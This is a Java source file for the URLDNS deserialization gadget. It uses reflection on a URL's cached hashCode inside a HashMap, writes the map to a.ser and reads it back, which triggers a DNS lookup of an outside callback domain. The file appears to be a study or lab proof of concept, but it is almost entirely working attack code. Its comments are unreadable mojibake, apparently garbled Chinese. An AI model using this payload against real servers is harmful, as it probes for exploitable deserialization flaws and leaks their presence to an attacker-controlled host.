import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class UrlDns {
    public static void main(String[] args) throws MalformedURLException, IllegalAccessException, NoSuchFieldException {
        /**
         *
         * URL��-->hashCode()����-->1.hashcode=!-1-->��ִ��DNS����
         *                      -->2.hashcode=-1-->handler.hashCode()(handerΪURLStreamHandler���
         *                          ��)-->getHostAddress(u)-->getByName(host)-->��һ��DNS����
         * HashMap��-->put(k,v)-->putVal()-->hash(k)-->k.hashCode()
         * HashMap��
         * ��HashMap��key����ΪUrl���͵Ļ���k.hashCode()�ͻ�ִ��URL���hashCode����
         * hashCode����Ĭ��Ϊ-1��Ҳ����˵�����url��Ĭ��ִ��һ�ν�����Ϊ����֤�Ƿ���ڷ����л����ڣ���Ҫ�ڷ����л�֮ǰ��ִ��dns������
         * �����Ҫͨ�����佫hashCode��v��Ϊ��������ִ�����л��뷴���л�����
         */
        HashMap<URL, Integer> hashmap = new HashMap<>();

        URL url = new URL("http://11e0086a.dns.1433.eu.org");

        Class urlClass = url.getClass();
        Field field = urlClass.getDeclaredField("hashCode");//�õ�URL���hashCode�ֶΣ�Ĭ��Ϊ-1��
        //getDeclaredFields����ȡ��ǰ��������ֶΣ����� protected/Ĭ��/private ���ε��ֶΣ�����������public ���ε��ֶΡ�

        field.setAccessible(true);
        field.set(url,3);//����url��hashCodeֵΪ3

        hashmap.put(url,1);//

        field.set(url,-1);
        // int hashCode = url.hashCode();


        try{
            //���л�
            FileOutputStream fileOutputStream = new FileOutputStream("a.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();
            fileOutputStream.close();

            //�����л�
            FileInputStream fileInputStream = new FileInputStream("a.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();

        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }


    }




}
